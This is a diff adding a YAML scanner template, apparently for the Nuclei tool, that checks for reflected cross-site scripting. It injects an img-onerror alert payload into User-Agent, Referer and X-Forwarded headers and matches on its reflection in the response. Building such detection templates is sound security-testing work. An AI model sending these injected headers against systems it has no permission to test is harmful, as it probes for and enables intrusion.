@@ -1,0 +1,28 @@
+id: reflected-xss-header-img
+
+info:
+  name: Reflected XSS via header
+  author: reewardius
+  severity: high
+  tags: generic,xss,reflected
+  
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: "><img src=xx onerror=alert(1)>//
+        Referer: "><img src=xx onerror=alert(1)>//
+        X-Forwarded-Host: bing.com"><img src=xx onerror=alert(1)>//
+        X-Forwarded-For: bing.com"><img src=xx onerror=alert(1)>//
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<img src=xx onerror=alert(1)>'
+          
+      - type: status
+        status:
+          - 200
